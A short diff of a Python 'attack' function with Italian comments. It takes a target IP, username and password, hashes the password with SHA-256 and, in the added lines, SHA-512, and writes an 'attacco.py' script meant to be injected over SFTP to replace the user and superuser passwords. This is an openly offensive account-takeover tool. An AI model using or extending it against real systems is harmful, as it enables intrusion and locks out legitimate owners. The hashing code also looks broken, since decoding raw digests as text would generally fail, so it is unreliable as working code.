@@ -29,11 +29,13 @@ def attack():
     print(f"'{ip}', '{uname}', '{password}'")
 
     newP = hashlib.sha256(password.encode()).digest().decode()  # la password è soggetta all'algoritmo di hash sha256
+    newP_su = hashlib.sha512(newP.encode()).digest().decode()   # la password è soggetta all'algoritmo di hash sha512
     fpI = open('static/python/setup_attacco.txt', 'r')
     fpO = open('static/python/attacco.py', 'w')
 
     # scrivo il file python da iniettare con sftp
     fpO.write(f"old_password = '{password}'\n")
+    fpO.write(f"new_su_password = '{newP_su}'\n")
     fpO.write(f"new_password = '{newP}'\n")
     fpO.write(f"uname = '{uname}'\n\n")
     for line in fpI.readlines():
